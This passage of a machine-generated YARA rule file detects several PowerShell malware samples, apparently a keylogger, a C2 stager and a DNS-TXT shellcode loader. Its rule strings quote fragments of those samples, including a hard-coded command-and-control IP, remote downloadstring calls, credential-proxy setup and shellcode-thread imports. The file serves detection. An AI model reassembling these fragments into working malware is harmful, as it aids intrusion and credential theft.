      $s10 = "                $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s11 = "                $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s12 = "                $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s13 = "    http://www.exploit-monday.com/" fullword ascii /* score: '16.00'*/
      $s14 = "                $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s15 = "                $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s16 = "                $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s17 = "                $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s18 = "                $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s19 = "                $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
      $s20 = "                $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 30KB and
      8 of them
}

rule afb46cd7278a77cfb28903bf221e68134f55032138850d6fefe70945dc8abfcf {
   meta:
      description = "mw - file afb46cd7278a77cfb28903bf221e68134f55032138850d6fefe70945dc8abfcf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "afb46cd7278a77cfb28903bf221e68134f55032138850d6fefe70945dc8abfcf"
   strings:
      $s1 = "$o=\"$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://213.227.155.25:443\"" fullword ascii /* score: '29.00'*/
      $s2 = "if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add(\"Host\",$h)}" fullword ascii /* score: '24.00'*/
      $s3 = "$primer = (Get-Webclient -Cookie $pp).downloadstring($s)" fullword ascii /* score: '22.00'*/
      $s4 = "} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, \"SessionID=$Cookie\") }" fullword ascii /* score: '21.00'*/
      $s5 = "$wc.Headers.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.38" ascii /* score: '20.00'*/
      $s6 = "$getcreds = new-object system.management.automation.PSCredential $username,$PSS;" fullword ascii /* score: '20.00'*/
      $s7 = "$wc.Headers.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.38" ascii /* score: '20.00'*/
      $s8 = "$PSS = ConvertTo-SecureString $password -AsPlainText -Force;" fullword ascii /* score: '18.00'*/
      $s9 = "$wp.Credentials = $getcreds;" fullword ascii /* score: '17.00'*/
      $s10 = "{$a.Key = [System.Convert]::FromBase64String($key)}" fullword ascii /* score: '17.00'*/
      $s11 = "$d = (Get-Date -Format \"dd/MM/yyyy\");" fullword ascii /* score: '16.00'*/
      $s12 = "if ($key.getType().Name -eq \"String\")" fullword ascii /* score: '16.00'*/
      $s13 = "if ($username -and $password) {" fullword ascii /* score: '16.00'*/
      $s14 = "$wc = New-Object System.Net.WebClient;" fullword ascii /* score: '14.00'*/
      $s15 = "$e = $a.CreateEncryptor()" fullword ascii /* score: '14.00'*/
      $s16 = "if ($IV.getType().Name -eq \"String\")" fullword ascii /* score: '13.00'*/
      $s17 = "$wp = New-Object System.Net.WebProxy($proxyurl,$true);" fullword ascii /* score: '13.00'*/
      $s18 = "elseif($h){$script:s=\"https://$($h)/babel-polyfill/6.3.14/\";$script:sc=\"https://$($h)\"}" fullword ascii /* score: '13.00'*/
      $s19 = "$wc.Headers.Add(\"Referer\",\"\")" fullword ascii /* score: '12.00'*/
      $s20 = "$wc.Proxy.Credentials = $wc.Credentials;" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x535b and filesize < 9KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _dc3c6daf88e79c8c92d54a666b242a5d78d75b3970d695a76a71034036d1af7f_de4c1f41106abba85c839b64ed2517608b8ef7f06eb1323a285b8014e1_0 {
   meta:
      description = "mw - from files dc3c6daf88e79c8c92d54a666b242a5d78d75b3970d695a76a71034036d1af7f, de4c1f41106abba85c839b64ed2517608b8ef7f06eb1323a285b8014e1113621"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "dc3c6daf88e79c8c92d54a666b242a5d78d75b3970d695a76a71034036d1af7f"
      hash2 = "de4c1f41106abba85c839b64ed2517608b8ef7f06eb1323a285b8014e1113621"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/" fullword ascii /* score: '26.00'*/
      $s4 = "Blog: http://clymb3r.wordpress.com/" fullword ascii /* score: '22.00'*/
      $s5 = "Github repo: https://github.com/clymb3r/PowerShell" fullword ascii /* score: '22.00'*/
      $s6 = "This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection." ascii /* score: '21.00'*/
      $s7 = "This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection." ascii /* score: '21.00'*/
      $s8 = "    # Get a reference to System.dll in the GAC" fullword ascii /* score: '19.00'*/
      $s9 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '            ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAAD" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                 ' */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAC" ascii /* base64 encoded string '           ' */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAE" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s16 = "AAAAAAAAAAB" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s17 = "$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)" fullword ascii /* score: '15.00'*/
      $s18 = "$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]" fullword ascii /* score: '15.00'*/
      $s19 = "        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }" fullword ascii /* score: '14.00'*/
      $s20 = "AAAAAAAACA" ascii /* reversed goodware string 'ACAAAAAAAA' */ /* score: '12.50'*/
   condition:
      ( ( uint16(0) == 0x7566 or uint16(0) == 0x7546 ) and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a92fddb751dded78978966940c7753531c18eb82e5ba8e97105a9e6509ef98b3_e1af864279276eaca3901d8e57c7aacaf0fbd17b747c9827e1e1cbc26d_1 {
   meta:
      description = "mw - from files a92fddb751dded78978966940c7753531c18eb82e5ba8e97105a9e6509ef98b3, e1af864279276eaca3901d8e57c7aacaf0fbd17b747c9827e1e1cbc26d11a95c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-11"
      hash1 = "a92fddb751dded78978966940c7753531c18eb82e5ba8e97105a9e6509ef98b3"
      hash2 = "e1af864279276eaca3901d8e57c7aacaf0fbd17b747c9827e1e1cbc26d11a95c"
   strings:
      $s1 = "http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html" fullword ascii /* score: '26.00'*/
      $s2 = "The code execution logic is based on this post by Matt." fullword ascii /* score: '22.00'*/
      $s3 = ".PARAMETER shellcode64" fullword ascii /* score: '21.00'*/
      $s4 = "Payload which could execute shellcode from DNS TXT queries." fullword ascii /* score: '21.00'*/
      $s5 = ".PARAMETER shellcode32" fullword ascii /* score: '21.00'*/
      $s6 = "PS > Execute-DNSTXT-Code" fullword ascii /* score: '18.00'*/
      $s7 = "function Execute-DNSTXT-Code" fullword ascii /* score: '18.00'*/
      $s8 = "https://github.com/samratashok/nishang" fullword ascii /* score: '17.00'*/
      $s9 = "Use above from non-interactive shell." fullword ascii /* score: '16.00'*/
      $s10 = "    [DllImport(\"msvcrt.dll\")] " fullword ascii /* score: '14.00'*/
      $s11 = "    [DllImport(\"kernel32.dll\")] " fullword ascii /* score: '14.00'*/
      $s12 = "        $ShellCode64," fullword ascii /* score: '13.00'*/
      $s13 = "        $ShellCode32," fullword ascii /* score: '13.00'*/
      $s14 = "The payload will ask for all required options." fullword ascii /* score: '13.00'*/
      $s15 = "    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParame" ascii /* score: '8.00'*/
      $s16 = "    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParame" ascii /* score: '8.00'*/
      $s17 = "Authoritative Name Server for the domains." fullword ascii /* score: '7.00'*/
      $s18 = " .PARAMETER AUTHNS" fullword ascii /* score: '7.00'*/
      $s19 = "ter, uint dwCreationFlags, IntPtr lpThreadId); " fullword ascii /* score: '7.00'*/
      $s20 = "    $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru " fullword ascii /* score: '6.00'*/
   condition:
      ( ( uint16(0) == 0x7566 or uint16(0) == 0x233c ) and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

